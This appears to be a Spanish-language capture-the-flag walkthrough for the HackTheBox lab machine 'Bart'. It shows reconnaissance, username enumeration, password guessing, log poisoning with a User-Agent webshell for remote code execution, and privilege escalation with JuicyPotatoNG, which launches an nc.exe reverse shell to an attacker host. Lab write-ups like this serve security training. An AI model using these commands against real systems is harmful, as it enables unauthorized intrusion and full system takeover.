---

---
-----------
- Tags: #subdomain #information-leakage #username-enumeration #simple-chat #log-poison #nishang #juicypotato #SeImpersonatePrivilege
- --------
## Técnicas utilizadas
- Subdomain Enumeration - Gobuster  
- Information Leakage  
- Username enumeration - Abusing the Forget Password Option  
- Simple Chat Exploitation - Creating a new user  
- Log Poisoning Attack - User Agent [RCE]  
- Nishang Invoke-PowerShellTcp Shell  
- Abusing SeImpersonatePrivilege [Privilege Escalation]
## Procedimiento
![[Pasted image 20230901224733.png]]

#### Reconocimiento
Si lanzamos un **nmap** contra la maquina podemos ver los siguientes puertos abiertos con sus respectivos servicios y versiones:
```ruby
# nmap -sCV -p80 10.10.10.81 -oN Ports
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-03 14:24 PDT
Nmap scan report for 10.10.10.81
Host is up (0.063s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Did not follow redirect to http://forum.bart.htb/
|_http-server-header: Microsoft-IIS/10.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.74 seconds
```

Un escaneo con **WhatWeb** sobre el aplicativo web, nos muestra estas tecnologías disponibles:
```ruby
# whatweb 10.10.10.81
http://10.10.10.81 [302 Found] Country[RESERVED][ZZ], HTTPServer[Microsoft-IIS/10.0], IP[10.10.10.81], Microsoft-IIS[10.0], PHP[7.1.7], RedirectLocation[http://forum.bart.htb/], X-Powered-By[PHP/7.1.7]
[http://forum.bart.htb/ [200 OK] Bootstrap, Country[RESERVED][ZZ], Email[d.simmons@bart.htb,h.potter@bart.htb,info@bart.htb,r.hilton@bart.htb,s.brown@bart.loca,s.brown@bart.local], HTML5, HTTPServer[Microsoft-IIS/10.0], IP[10.10.10.81], JQuery, MetaGenerator[WordPress 4.8.2], Microsoft-IIS[10.0], PoweredBy[WordPress], Script[text/javascript], Title[BART], WordPress[4.8.2]
```

----------
#### Subdomain Enumeration - Gobuster  
En el whatweb podemos ver algunos correos, vemos tambien en ellos un dominio disponible:
```
d.simmons@bart.htb,h.potter@bart.htb,info@bart.htb,r.hilton@bart.htb,s.brown@bart.loca,s.brown@bart.local
```
Con estos dominios vamos aplicar fuzzing para intentar encontrar nuevos subdominios disponibles:
```c
# fuzz -c --hc=404,302 -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -u "http://bart.htb" -H 'Host: FUZZ.bart.htb'
[...]
000000023:   200        548 L    2412 W     35529 Ch    "forum"                                                   
000000099:   200        80 L     221 W      3423 Ch     "monitor"
[...]
```

--------------
#### Information Leakage 
En la subdominio `forum.bart.htb` podemos encontrar algo interesante revisando el codigo fuente:
```

<!-- <div class="owl-item" style="width: 380px;"><div class="team-item"> 
<div class="team-inner">
<div class="pop-overlay">
<div class="team-pop">
<div class="team-info">
<div class="name">Harvey Potter</div>
<div class="pos">Developer@BART</div>
<ul class="team-social">
<li><a class="facebook" href="#" target="_blank"><i class="fa">F</i></a></li>
<li><a class="twitter" href="#" target="_blank"><i class="fa">T</i></a></li>
<li><a class="google" href="#" target="_blank"><i class="fa">G</i></a></li>
<li><a class="mail" href="mailto:h.potter@bart.htb" target="_blank"><i class="fa">M</i></a></li>
</ul>
</div>
</div>
</div>
<div class="avatar">
<img src="webste/1_002.jpg" class="attachment-sydney-medium-thumb size-sydney-medium-thumb wp-post-image" alt="" sizes="(max-width: 400px) 100vw, 400px" width="400" height="400"> </div>
</div>
<div class="team-content">
<div class="name">
Harvey Potter </div>
<div class="pos">Developer@BART</div>
</div>
</div></div>
<!-- Adding other employees breaks the CSS, I will fix it later. -->
```

Encontramos la posible cuenta de un desarrollador `h.potter@bart.htb`

#### Username enumeration - Abusing the Forget Password Option  
En el subdominio de `monitor.bart.htb` encontramos un **Login**. Hay una opcion para recuperar contraseña, esta parece ser vulnerable a enumeracion de usuarios dado que si colocamos un usuario que no existe nos muestra este mensaje:
![[Pasted image 20230903145128.png]]

Y si acertamos con un usuario correcto nos muestra esto:

![[Pasted image 20230903145208.png]]

La contraseña del usuario **Harvey** se puede deducir por su apellido, asi que si intentamos iniciar sesion con `Harvey:potter`nos deberia dejar entrar.
#### Simple Chat Exploitation - Creating a new user 
Dentro encontramos un dashboard y encontramos que hay un chat interno disponible:
![[Pasted image 20230903150933.png]]

Si ingresamos a el, encontramos un subdomnio nuevo:
![[Pasted image 20230903151037.png]]

Al ingresar vemos un Login muy cutre. Investigando por google, encontramos el [repositorio](https://github.com/magkopian/php-ajax-simple-chat/tree/master/simple_chat) del proyecto. Vemos que hay una ruta de registro:
![[Pasted image 20230903151750.png]]

Al intentar visitarla en el navegador nos manda un redirect al login, sin embargo, si mandamos una peticion con **Curl** si que nos deja registrar un usuario:
```ruby
# curl -s -X POST http://internal-01.bart.htb/simple_chat/register.php -d "uname=administrator&passwd=administrator"
```

Despues de burlar esta pequeña traba, encontramos un chat interno:
![[Pasted image 20230903151922.png]]

---------
#### Log Poisoning Attack - User Agent [RCE]  
En una esquina del chat vemos que hay un enlace que dice **Log** si interceptamos la peticion de cuando clickeamos aqui, vemos que esta intentando depositar un log en **log.txt**:
![[Pasted image 20230903152739.png]]

Pero, si intentamos apuntar al propio **log.php** (para que escriba en el archivo) y mandamos en el **user-agent** una tipica webshell para posteriormente ejecutar comandos, vemos que nos regresa un "1" que quiere decir que es correcto:
![[Pasted image 20230903152950.png]]

Ahora, al mandar un comando al parametro **CMD** veremos el output del comando:
![[Pasted image 20230903153021.png]]

---------
#### Nishang Invoke-PowerShellTcp Shell  
Con la ejecucion remota de comando asegurada, usaremos el **Invoke-Powershell.ps1** para ganar acceso a la maquina

-------
#### Abusing SeImpersonatePrivilege [Privilege Escalation]
Una vez dentro, podemos listar nuestros pivilegios y observamos que tenemos asignado el **SeIMpersonatePrivilege**:
```
PS C:\Users> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name          Description                               State  
======================= ========================================= =======
SeChangeNotifyPrivilege Bypass traverse checking                  Enabled
SeImpersonatePrivilege  Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege Create global objects                     Enabled
```

Con esto, podemos basicamente impersonar a otro usuario (en este caso al administrador). Todo, gracias a **Juicy Potato** del siguiente [repositorio](https://github.com/antonioCoco/JuicyPotatoNG/releases/download/v1.1/JuicyPotatoNG.zip). Una vez arriba el binario, tambien subiremos **nc.exe** para entablarnos una reverse shell y ejecutaremos entonces, el siguiente comando:
```powershell
PS C:\tmp> .\JuicyPotatoNG.exe -t * -l 1337 -p C:\Windows\System32\cmd.exe -a "/c C:\Tmp\nc.exe -e cmd 10.10.14.9 443"


	JuicyPotatoNG
	by decoder_it & splinter_code

[*] Testing CLSID {854A20FB-2D44-457D-992F-EF13785D2B51} - COM server port 1337 
[+] authresult success {854A20FB-2D44-457D-992F-EF13785D2B51};NT AUTHORITY\SYSTEM;Impersonation
[+] CreateProcessAsUser OK
[+] Exploit successful! 
```

Y por otro lado, ganariamos acceso a la maquina como "**nt authority\\system**":
```powershell
# rlwrap nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.9] from (UNKNOWN) [10.10.10.81] 49946
Microsoft Windows [Version 10.0.15063]
(c) 2017 Microsoft Corporation. All rights reserved.
C:\>whoami
whoami
nt authority\system
```

